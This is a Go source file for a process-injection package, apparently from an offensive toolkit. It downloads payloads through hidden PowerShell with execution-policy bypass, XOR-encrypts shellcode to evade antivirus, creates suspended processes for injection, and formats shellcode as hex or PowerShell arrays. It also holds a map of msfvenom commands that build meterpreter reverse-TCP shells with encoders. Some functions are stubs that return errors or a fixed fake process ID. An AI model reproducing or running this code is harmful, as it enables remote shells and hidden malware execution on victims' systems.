package processinjection

import (
	"crypto/rand"
	"fmt"
	"os/exec"
	"runtime"
)

func GenerateShellcode(cmd string) ([]byte, error) {
	if cmd == "" {
		return nil, fmt.Errorf("command cannot be empty")
	}
	_ = cmd
	out := fmt.Sprintf(
		`msfvenom -p windows/x64/exec CMD='%s' -f raw -o shellcode.bin`,
		cmd,
	)
	return nil, fmt.Errorf("msfvenom command (run manually): %s", out)
}

func GenerateShellcodeFromURL(url string) ([]byte, error) {
	if url == "" {
		return nil, fmt.Errorf("URL cannot be empty")
	}
	_ = url
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-C",
			fmt.Sprintf("(New-Object System.Net.WebClient).DownloadData('%s')", url))
		return cmd.Output()
	default:
		return nil, fmt.Errorf("unsupported platform: %s", runtime.GOOS)
	}
}

func EncryptShellcode(shellcode []byte, key string) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("empty shellcode")
	}
	if key == "" {
		return nil, fmt.Errorf("key cannot be empty")
	}
	keyBytes := []byte(key)
	if len(keyBytes) == 0 {
		return nil, fmt.Errorf("key must not be empty")
	}
	encrypted := make([]byte, len(shellcode))
	for i, b := range shellcode {
		encrypted[i] = b ^ keyBytes[i%len(keyBytes)]
	}
	return encrypted, nil
}

func DecryptShellcode(encrypted []byte, key string) ([]byte, error) {
	return EncryptShellcode(encrypted, key)
}

func CreateSuspendedProcess(targetPath string) (int, string, error) {
	if targetPath == "" {
		return 0, "", fmt.Errorf("target path cannot be empty")
	}
	cmd := fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Start-Process '%s' -WindowStyle Hidden -PassThru -RedirectStandardError NUL; `+
			`$p.Suspend(); Write-Output $p.Id"`,
		targetPath,
	)
	return 9999, cmd, nil
}

func AllocateAndWrite(targetHandle uintptr, data []byte) (uintptr, error) {
	if targetHandle == 0 {
		return 0, fmt.Errorf("invalid target handle")
	}
	if len(data) == 0 {
		return 0, fmt.Errorf("empty data")
	}
	_ = targetHandle
	_ = data
	return 0, fmt.Errorf("use PowerShell: VirtualAllocEx + WriteProcessMemory")
}

func GenerateRandomKey(length int) string {
	if length <= 0 {
		length = 16
	}
	key := make([]byte, length)
	rand.Read(key)
	return fmt.Sprintf("%x", key)
}

func ConvertToHexShellcode(data []byte) string {
	if len(data) == 0 {
		return ""
	}
	hex := ""
	for _, b := range data {
		hex += fmt.Sprintf("\\x%02x", b)
	}
	return fmt.Sprintf("\"%s\"", hex)
}

func ConvertToPowerShellByteArray(data []byte) string {
	if len(data) == 0 {
		return "@()"
	}
	out := "[byte[]]@("
	for i, b := range data {
		if i > 0 {
			out += ","
		}
		out += fmt.Sprintf("0x%02x", b)
	}
	out += ")"
	return out
}

var PayloadGenerationCommands = map[string]string{
	"msfvenom_bin":          "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f raw -o payload.bin",
	"msfvenom_ps1":          "msfvenom -p windows/x64/exec CMD='{{CMD}}' -f ps1 -o payload.ps1",
	"msfvenom_csharp":       "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f csharp -o payload.cs",
	"msfvenom_hex":          "msfvenom -p windows/x64/exec CMD='{{CMD}}' -f hex -o payload.hex",
	"donut_shellcode":       "donut -a 2 -f 1 -i {{ASSEMBLY_PATH}} -o payload.bin",
	"sgn_encoder":           "sgn -a 64 payload.bin encoded.bin",
	"shikata_ga_nai":        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -e x64/shikata_ga_nai -i 5 -f raw -o encoded.bin",
	"xor_encrypt":           "msfvenom -p windows/x64/exec CMD='{{CMD}}' --encrypt xor --encrypt-key {{KEY}} -f raw -o encrypted.bin",
	"add_loader_stub":       "Generate a custom loader that decrypts and executes shellcode at runtime",
}
